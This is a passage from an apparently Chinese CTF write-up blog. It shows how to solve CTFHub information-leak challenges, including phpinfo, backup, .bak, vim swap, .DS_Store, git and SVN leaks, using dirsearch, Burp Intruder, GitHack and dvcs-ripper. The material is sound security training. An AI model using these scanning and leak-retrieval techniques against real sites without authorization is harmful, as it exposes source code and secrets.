src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912336.png"></p><p>二、题目考点</p><p>phpinfo() 是php中查看相关信息的函数，当在页面中执行phpinfo()函数时，php会将自身的所有信息全部打印出来。在phpinfo中会泄露很多服务端的一些信息。</p><p>例如安装的一些模块、网站绝对路径、服务器自身的操作系统、使用的组件版本等等，在phpinfo中获得的这些信息会为下一步的渗透&#x2F;做题提供一些帮助</p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>一、wp</p><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>题目应该就是让我们找备份的“源代码”（实际过程中我们找的是源代码，但这里应该是flag），这个源代码可能备份在下面提示中</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912321.jpeg"></p><p>顾名思义，备份文件备份的都是文件，所以遍历一下上面的文件名及后缀。</p><p>在这里给出四种扫描方法：</p><p>1、御剑</p><p>御剑有点坑，将超时延长，并且只扫DIR(目录;显示文件列表)，还得多扫几次才行。</p><p>所以御剑最好还是得自定义目录（把题目给的添加上去）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912877.png"></p><p>2、dirsearch</p><p>暴力扫就可以，除了慢没啥缺点。</p><p>查看返回值，大部分都是503，返回200的表示可以访问</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912287.jpeg"></p><p>3、burpsuite</p><p>相对而言比较复杂，但是比较贴近题目，充分利用了题目的提示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912970.png"></p><p>抓包，发送到Intruder,</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912097.png"></p><p>在GET&#x2F;后面（即网站地址处）添加两个负载，一个文件名，一个扩展名，用cluster bomb,</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912220.png"></p><p>爆破文件名，这里需要添加一个后缀：.（点）</p><p>（也可以在payload2备份文件格式的前面加前缀 . ）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912542.png"></p><p>爆破扩展名, 注意两者都不用payload encoding</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912875.png"></p><p>开始攻击，出货</p><p>注：载荷尽量自己写，作者直接复制题目提示的，发现不合规范，不出flag</p><p>4、最后一种方法，如果不怕麻烦，也可以自己一个个试（人工扫描）</p><p>二、题目考点</p><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。这里有诸多目录，要求从中找出有效文件</p><p>三、相关知识</p><p>1、御剑的使用</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p>2、dirsearch的使用</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p>3、备份文件的访问</p><p>不要忽视对网站备份文件的搜查，里面可能会有有用的信息</p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>一、wp</p><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912678.png"></p><p>&lt;法1&gt;、</p><p>一进去就说flag在index.php中，在当前网址加上&#x2F;index.php，没反应，考虑到是bak文件，输入&#x2F;index.php.bak（要把题目提示结合起来考虑），下载了一个文件，用记事本打开，出flag</p><p>&lt;法2&gt;、</p><p>也可以用curl打开index.php.bak，殊途同归</p><p>&lt;法3&gt;、</p><p>用dirsearch也可以直接扫出来，这样是最简单的方法，扫出来在加到url上，也可以下载</p><p>二、题目考点</p><p>1、进一步考察web目录下的备份文件，这一题与网站源码一题一样，都是将源码备份，放在web目录下，不过这次是bak文件。</p><p>2、bak文件泄露：有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码</p><p>三、相关知识</p><p>1、 bak 是一个 备份文件 ，是一个文件格式的扩展名。这类文件一般在.bak前面加上应该有原来的扩展名比如windows.dll.bak，或是windows_dll.bak，有的则是由原文件的后缀名和bak混合而成。</p><p>很多软件都会创建一个备份文件，当软件不小心因为删除或者机器意外关闭时，可以通过软件当时创建的备份文件继续编辑，为软件使用者减少了较大工作和损失。</p><p>2、附加知识点：文件恢复打开</p><p>一般来讲 ，.bak文件作为备份文件，可以通过直接重命名，把bak替换成原文件的格式就可以恢复此文件并且正常打开了。</p><p>举个简单例子：在autocad文件移动的时候有时会产生.bak文件，比如现在有一个asdfjk.dwg文件的备份文件asdfjk.bak ，想要把备份文件恢复成正式文件 只需要对该备份文件重命名把bak替换为dwg就可以打开了 。</p><p>同样，如果是word文件的备份文件只要把bak换成doc就可以了。（其实可以改成任何文件格式）。但是，加密过的.bak文件是无法通过修改重命名来打开的，就是打开了也是乱码。</p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>一、wp</p><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912952.png"></p><p>&lt;法1&gt;、</p><p>直接在url上加上&#x2F;index.php，毫无反应，再加上vim，也不好使。</p><p>在这里要知道vim异常退出时，会产生swp文件，但是输入&#x2F;index.php.swp也不行，然后需要知道swp是隐藏文件，最前面要加点<code>.</code>，应该输入<code>/.index.php.swp</code>，成功下载文件，记事本打开，得到flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912016.png"></p><p>&lt;法2&gt;、</p><p>利用curl访问（道理同上）即可直接看到flag，因为vim使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912568.png"></p><p>&lt;法3&gt;、</p><p>这是最贴近题目的，之前的查看方式都会有乱码。</p><p>先用wget下载<code>.index.php.swp</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912271.png"></p><p>这里有两种打开方式</p><p>1）直接用vim打开下载的文件<code>vim -r .index.php.swp</code>，回车</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912337.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913764.png"></p><p>2）先恢复再打开，输入 vim index.php 去打开index.php，发现交换文件，按r恢复</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913771.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913139.png"></p><p>二、题目考点</p><p>1、Vim异常退出后产生的文件</p><p>2、隐藏文件的访问</p><p>3、linux中vim的应用</p><p>      参考文献：</p><p>      <a href="https://blog.csdn.net/blood_Z/article/details/125064927" title="      vim命令大全-CSDN博客">vim命令大全-CSDN博客</a></p><p>三、相关知识</p><p>1、swp文件</p><p>1）vim中的swp是swap（交换分区）的简写，在编辑文件时产生，它是隐藏文件。这个文件是一个临时交换文件，用来备份缓冲区中的内容。类似于Windows的虚拟内存，就是当内存不足的时候,把一部分硬盘空间虚拟成内存使用,从而解决内存容量不足的情况。如果文件正常退出，则此文件自动删除。如果并没有对文件进行修改，而只是读取文件，是不会产生swp文件的。</p><p>2）在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。以 index.php 为例：第一次产生的交换文件名为 .index.php.swp；</p><p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件；</p><p>第三次产生的交换文件则为 .index.php.swn；</p><p>2、隐藏文件的访问</p><p> .swp是隐藏文件，因此最前面有<code>.</code>，即 <code>.index.php.swp</code>，(注意是index前面的点)。</p><p> 3、vim编辑器的使用</p><p><code>vim -r</code> 可以查看当前目录下所有的swp文件。</p><p><code>vim -r filename</code>可以恢复文件，这样上次意外退出没有保存的修改，就会覆盖文件。</p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>一、wp</p><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913651.png"></p><p>&lt;法1&gt;、尝试访问<code>url/.DS_Store</code>（用dirsearch可以直接扫出来），下载文件，记事本打开，看到 flag here!，但有好多空格，我们用记事本的编辑功能，然后点击替换，将空格替换成空，就是把所有的空格清除，得到下面的内容。</p><p>注：.txt后面一串字符，其中notuestr是注释的意思，这串字符的意思是“注释 flag 在这！”</p><p>所以我们只复制到.txt，尝试粘贴到url中访问，获得flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913344.png"></p><p>&lt;法2&gt;、Curl也可以</p><p>没有空格，不需要去替换</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913445.png"></p><p>&lt;法3&gt;、使用Linux系统打开文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913850.png"></p><p>然后在url中访问</p><p>&lt;法4&gt;、工具Python-dsstore</p><p>使用Python-dsstore工具查看该文件</p><p>访问<code>url/.DS_Store</code>，把下载下来的文件复制到Python-dsstore文件夹中，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913948.png"></p><p>然后在Python-dsstore文件夹处打开cmd，输入以下命令</p><p><code>python main.py 无标题.DS\_Store</code></p><p>注：这里“无标题.DS_Store”是作者下载的文件的名字，大家如果改名了或者名字不相同，应该用自己下载的文件的名字</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913038.png"></p><p>二、题目考点</p><p>DS_Store 文件利用。</p><p>题目描述：DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>三、相关知识</p><p>1、工具Python-dsstore的应用</p><p>具体内容请看作者的另一篇文章：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p>2、linux常用指令</p><p>这里只讲cat及类似命令</p><p>cat 命令：用于查看文本文件的内容，后接要查看的文件名，通常可用管道与 more 和 less 一起使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> file1 从第一个字节开始正向查看文件的内容<br> <br><span class="hljs-built_in">cat</span> -n file1 标示文件的行数<br> <br><span class="hljs-built_in">cat</span> xxx.txt awk ‘NR%2==1’<br> <br><span class="hljs-built_in">tac</span> file1 从最后一行开始反向查看一个文件的内容<br> <br>more file1 查看一个长文件的内容<br> <br>less file1 类似 more 命令，但允许方向操作<br> <br><span class="hljs-built_in">head</span> -n 2 file1 查看一个文件的前两行<br> <br><span class="hljs-built_in">tail</span> -f /log/msg 实时查看添加到⽂件中的内容<br> <br><span class="hljs-built_in">tail</span> -n 2 file1 查看一个文件的最后两行<br> <br><span class="hljs-built_in">tail</span> -n +1000 file1 从1000行开始显示，显示1000行以后的<br> <br><span class="hljs-built_in">cat</span> filename | <span class="hljs-built_in">head</span> -n 3000 | <span class="hljs-built_in">tail</span> -n +1000 显示1000行到3000行<br> <br><span class="hljs-built_in">cat</span> filename | <span class="hljs-built_in">tail</span> -n +3000 | <span class="hljs-built_in">head</span> -n 1000 从第3000行开始，显示1000(即显示3000~3999行)<br> <br>grep ss hello.txt 在⽂件hello.txt中查找关键词 ss<br> <br>grep ^s hello.txt 在⽂件hello.txt中查找以 s 开头的内容<br> <br>grep [0-9] hello.txt 选择hello.txt⽂件中所有包含数字的⾏<br> <br>sed <span class="hljs-string">&#x27;s/ss/mm/g&#x27;</span> hello.txt 将hello.txt⽂件中的 ss 替换成 mm<br> <br>sed <span class="hljs-string">&#x27;/^$/d&#x27;</span> hello.txt 从hello.txt⽂件中删除所有空⽩⾏<br> <br>sed <span class="hljs-string">&#x27;/ *#/d; /^$/d&#x27;</span> hello.txt 从hello.txt⽂件中删除所有注释和空⽩⾏<br> <br>sed -e <span class="hljs-string">&#x27;1d&#x27;</span> hello.txt 从⽂件hello.txt 中排除第⼀⾏<br> <br>sed -n <span class="hljs-string">&#x27;/s1/p&#x27;</span> hello.txt 查看只包含关键词<span class="hljs-string">&quot;s1&quot;</span>的⾏<br> <br>sed -e <span class="hljs-string">&#x27;s/ *$//&#x27;</span> hello.txt 删除每⼀⾏最后的空⽩字符<br> <br>sed -e <span class="hljs-string">&#x27;s/s1//g&#x27;</span> hello.txt 从⽂档中只删除词汇s1并保留剩余全部<br> <br>sed -n <span class="hljs-string">&#x27;1,5p;5q&#x27;</span> hello.txt 查看从第⼀⾏到第5⾏内容<br> <br>sed -n <span class="hljs-string">&#x27;5p;5q&#x27;</span> hello.txt 查看第5⾏<br> <br><span class="hljs-built_in">paste</span> file1 file2 合并两个⽂件或两栏的内容<br> <br><span class="hljs-built_in">paste</span> -d <span class="hljs-string">&#x27;+&#x27;</span> file1 file2 合并两个⽂件或两栏的内容，中间⽤<span class="hljs-string">&quot;+&quot;</span>区分<br> <br><span class="hljs-built_in">sort</span> file1 file2 排序两个⽂件的内容<br> <br><span class="hljs-built_in">sort</span> file1 file2 <span class="hljs-built_in">uniq</span><br> <br><span class="hljs-built_in">sort</span> file1 file2 <span class="hljs-built_in">uniq</span> -u<br> <br><span class="hljs-built_in">sort</span> file1 file2 <span class="hljs-built_in">uniq</span> -d<br> <br><span class="hljs-built_in">comm</span> -1 file1 file2 ⽐较两个⽂件的内容(去除’file1’所含内容)<br> <br><span class="hljs-built_in">comm</span> -2 file1 file2 ⽐较两个⽂件的内容(去除’file2’所含内容)<br> <br><span class="hljs-built_in">comm</span> -3 file1 file2 ⽐较两个⽂件的内容(去除两⽂件共有部分)<br></code></pre></td></tr></table></figure><p>3、.DS_Store 是什么文件</p><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。</p><p>相当于 Windows 下的 desktop.ini。</p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a><strong>Log</strong></h3><p>一、wp</p><p>看题目，很明显是git泄露</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913648.png"></p><p>用dirsearch一扫，确实是git泄露</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913034.png"></p><p>使用 GitHack 工具 clone 目标源代码到本地</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913571.png"></p><p>相关文件被储存到了最后一行的地方，然后我们进入dist&#x2F;challenge-037e8b2de8d972bf.sandbox.ctfhub.com_10800中</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913409.png"></p><p>打开终端，执行 git log 查看历史记录</p><p>发现add flag这次提交很可疑，</p><p>&lt;法1&gt;</p><p>直接与 add flag 这次提交进行比对（写前几个字符就行），  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">git</span> diff <span class="hljs-number">460</span>a<br></code></pre></td></tr></table></figure><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913455.png"></p><p>&lt;法2&gt;</p><p>直接切换到 add flag (460a) 这个版本,  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--hard 460a</span><br></code></pre></td></tr></table></figure><p>这个命令可以切换为之前的版本，输入完成后最后一个文件夹下会多出一个.txt文件，打开后就有flag。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021913733.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914066.png"></p><p>二、题目考点</p><p>1、git泄露</p><p>2、查看历史记录 <code>git log</code></p><p>3、切换版本 <code>git reset</code></p><p>4、对比两次提交 （查看变更内容）<code>git diff</code></p><p>三、相关知识</p><p><strong>1、git教程</strong></p><p>点此链接进行了解：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p><strong>2、git log详解 （log日志）</strong></p><p><code>git log</code> 可以让我们查看提交commit，接下来我们来一起探索git log提供的参数。</p><p>1） <code>--oneline</code></p><p>这个命令简化git log的默认的输出，仅仅输出commit hash 前7个字符串（不显示一大堆）和commit message.</p><p>git log默认会输出commit hash（提交对象的哈希值）, author（提交人）, date（提交时间）, commit message（提交说明）.</p><p>2） <code>--stat</code></p><p><code>--stat</code>:是在git log 的基础上输出文件增删改的统计数据。</p><p>3）<code>-p</code></p><p><code>-p</code>:控制输出每个commit具体修改的内容，输出的形式以diff的形式给出。</p><p>4 ）<code>git show</code></p><p><code>git show</code>命令同<code>git log -p</code>输出类似，只不过它只显示一个commit的内容，如果不指定commit hash, 它默认输出HEAD指向commit的内容.</p><p>5 ）<code>git shortlog</code></p><p>这个命令用来输出汇总信息，以作者进行分类。</p><p><code>git shortlog -s</code>：可以用来统计每个作者的commit数量</p><p><code>git shortlog -n</code>：可以用来对统计的量进行倒序排列</p><p>6 ）<code>--pretty</code></p><p>我们可以用–pretty来自定义输出的信息</p><p>8 ）限定log输出</p><p>直接在log命令之后，加 <code>-n</code>参数即可，n表示你要输出的数量.</p><p>9） 限定指定日期范围的log</p><p><code>--after</code>和<code>--before</code></p><p>10 ）控制是否显示merge的commit</p><p><code>--merges</code>或者<code>--no-merges</code></p><p>11） <code>--decoreate</code></p><p>该参数用来控制log输出时，显示对应commit所属的branch和tag信息</p><p><strong>3、GitHack的使用</strong></p><p>具体内容点击此链接：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a><strong>Stash</strong></h3><p>一、wp</p><p> 不用dirsearch扫也可以看出是git泄露</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914163.png"></p><p>直接用GitHack扫描，具体方式同上题</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914509.png"></p><p>发现已经Clone success</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914030.png"></p><p>题目是stash，优先考虑git的stash命令</p><p>执行<code>git stash list</code> ：查看stash了哪些存储;</p><p>执行<code>git stash pop</code>：恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@{0}</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914944.png"></p><p>出文件了，可以直接cat，也可去打开文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914505.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914227.png"></p><p>二、考点</p><ul><li>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</li></ul><p>三、相关知识</p><p><strong>git stash详解（Stash 翻译为藏匿，隐藏）</strong></p><p>1、<code>git stash</code>命令是干甚的</p><p>它会保存当前工作进度，会把暂存区和工作区的改动保存到一个未完结变更的堆栈中；执行完这个命令后，在运行 git status 命令，就会发现当前是一个干净的工作区，没有任何改动。注：git stash 是本地的，不会上传到服务器上。</p><p>简单来说， **<code>git stash</code>**这个命令可以将当前的工作状态保存到git栈，在需要的时候再恢复。</p><p>2、使用场景</p><p>由上点可推断出git stash的使用场景：</p><p>当在一个分支的开发工作未完成，却又要切换到另外一个分支进行开发的时候，可以先将自己写好的代码，储存到 git 栈，进行另外一个分支的代码开发。这时候 git stash命令就派上用场了！</p><p>3、使用</p><p>1）<code>git stash</code>的相关命令</p><p>&lt;1&gt;<code>git stash</code></p><p>        保存当前的工作区与暂存区的状态，把当前的修改的保存到git 栈，等以后需要的时候再恢复，git stash 这个命令可以多次使用，每次使用都会新加一个stash@{num}，num是编号</p><p>&lt;2&gt;<code>git stash save &#39;注释&#39;</code></p><p>        作⽤等同于git stash，区别是可以加⼀些注释， 执⾏存储时，添加注释，⽅便查找，例如git stash save ‘test’</p><p>&lt;3&gt;<code>git stash pop</code></p><p>        默认恢复git栈中最新的一个stash@{num}，建议在git栈中只有一条的时候使用，以免混乱                   </p><p>        注：该命令将堆栈中最新保存的内容删除</p><p>(即恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下，默认为第一个stash，就是stash@{0}，如果要应用并删除其他stash，命令：<code>git stash pop stash@&#123;$num&#125;</code> ，比如应用并删除第二个：<code>git stash pop stash@&#123;1&#125;</code>）   </p><p>&lt;4&gt;<code>git stash list</code></p><p>        查看当前stash的所有内容</p><p>&lt;5&gt;<code>git stash apply</code></p><p>        将堆栈中的内容恢复到当前分支下。这个命令不同于 git stash pop。该命令不会将内容从对堆栈中删除，也就是该命令能够将堆栈的内容多次运用到工作目录，适合用与多个分支的场景</p><p>        使用方法：<code>git stash apply stash@&#123;$num&#125;</code></p><p>&lt;6&gt;<code>git stash drop</code></p><p>        从堆栈中移除指定的stash</p><p>        使用方法：<code>git stash drop stash@&#123;$num&#125;</code></p><p>&lt;7&gt;<code>git stash clear</code></p><p>        移除全部的stash</p><p>&lt;8&gt;<code>git stash show</code></p><p>     查看堆栈中最新保存的stash和当前⽬录的差异，显⽰做了哪些改动，默认show第一个存储</p><table><thead><tr><th>命令名</th><th>作用</th></tr></thead><tbody><tr><td><code>git stash</code></td><td>隐藏当前的工作现场，此时，<code>git status</code>的结果是 clean</td></tr><tr><td><code>git stash list</code></td><td>查看所有隐藏，每一行的冒号前面的字符串就是标识此隐藏的id</td></tr><tr><td><code>git stash apply</code></td><td>重新显示标识为 id 的隐藏</td></tr><tr><td><code>git stash drop</code></td><td><code>git apply</code>恢复隐藏后，需要手动删除 list 列表中的记录</td></tr><tr><td><code>git stash pop</code></td><td>恢复最新的进度到工作区</td></tr><tr><td><code>git stash pop stash@[stash_id]</code></td><td>恢复指定的进度到工作区</td></tr></tbody></table><p>2）使用流程</p><p> &lt;1&gt;执行 <code>git stash</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914675.png"></p><p>&lt;2&gt;查看刚才保存的工作进度 <code>git stash list</code> （一般先使用 git stash list 查看有没有已经 stash 的记录，避免和自己的混淆，到时候使用时不知道是哪条记录）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914445.png"></p><p>保存注释的长这样：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914817.png"></p><p> 可以看到 stash@{0} 是刚才保存的</p><p>&lt;3&gt; 这时候在看分支已经是干净无修改的(改动都有暂存到 stash)</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914011.png"></p><p>&lt;4&gt; 现在就可以正常切换到目标分支，进行相应操作（假设要操作master分支）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914920.png"></p><p>&lt;5&gt; 其他分支处理完成，再切回来使用刚才的 stash, 还是先查看 暂缓列表</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914520.png"></p><p>&lt;6&gt; 选择使用暂缓 <code>git stash apply n</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914037.png"></p><p>注：n 是序号，如下图红色箭头指示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021914812.png"></p><p>这时就看到刚才保存的工作进度，已经原样恢复~大功告成！</p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>一、wp（基本同上）</p><p>用dirsearch一扫，发现git泄露（不用扫也可以）</p><p>再用GitHack扫</p><p>到相应的文件夹，发现直接就有txt文件，打开，出flag</p><p>二、相关知识</p><p>Index ：索引</p><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>一、wp</p><p>根据题目，显然是SVN泄露（其实应该先用<strong>dirsearch</strong>先扫的，这才是一个较完整的流程）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915885.png"></p><p>扫描发现有 .svn&#x2F; 目录，确认是 .svn 泄露。</p><p>进入dvcs-ripper所在目录，使用 dvcs-ripper 中的 <code>rip-svn.pl</code> 脚本进行 clone，将泄露的文件下载到本地目录中。（注：要先安装工具所需依赖库）</p><p>&lt;法1&gt;</p><p>这里由于是隐藏的，所以我们利用tree命令，用<code>tree .svn</code>的命令查看.svn中的历史。（注：使用<code>svn checkout</code>后，项目目录下会生成隐藏的.svn文件夹，Linux上用ls命令看不到，要用<code>ls -al</code>命令，所以这里也可以用<code>ls -al</code>命令，但没tree命令看的清晰）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915892.png"></p><p>网页提示说flag在服务端旧版本的源代码中，那么应该检查一下pristine文件是否存放flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915195.png"></p><p>寻找 <code>.svn/pristine/</code> 中的文件，</p><p>先找bf中的，发现是源代码，再找de中的，发现flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915379.png"></p><p>&lt;法2&gt; 也可以用ctrl+H显示隐藏文件夹，出现.svn文件夹</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915542.png"></p><p>也找到pristine文件夹（tree命令可以显得更清晰点，或许可以帮到忙）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915232.png"></p><p>照常找到flag。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915325.png"></p><p>二、题目考点</p><p>svn 目录结构</p><p>三、相关知识</p><p><strong>1、svn</strong></p><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p>简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p><p>集中式管理的工作流程如下图：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915418.png"></p><p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository 